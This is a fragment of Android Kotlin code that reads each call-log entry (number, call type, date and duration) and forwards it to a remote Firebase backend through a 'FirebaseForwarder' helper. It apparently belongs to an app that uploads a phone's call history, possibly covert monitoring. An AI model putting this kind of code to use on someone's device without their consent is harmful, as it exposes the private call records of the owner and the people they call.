                    val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "Unknown"
                    val type   = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val date   = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    val typeText = when (type) {
                        CallLog.Calls.INCOMING_TYPE  -> "📲 Incoming Call"
                        CallLog.Calls.OUTGOING_TYPE  -> "📞 Outgoing Call"
                        CallLog.Calls.MISSED_TYPE    -> "📵 Missed Call"
                        CallLog.Calls.REJECTED_TYPE  -> "🚫 Rejected Call"
                        else                         -> "📳 Unknown Call"
                    }
                    val mins = dur / 60
                    val secs = dur % 60
                    val durationText = if (dur > 0) "${mins}m ${secs}s" else "0s"

                    FirebaseForwarder.sendHistoricalCallLog(context, number, typeText, durationText, date)
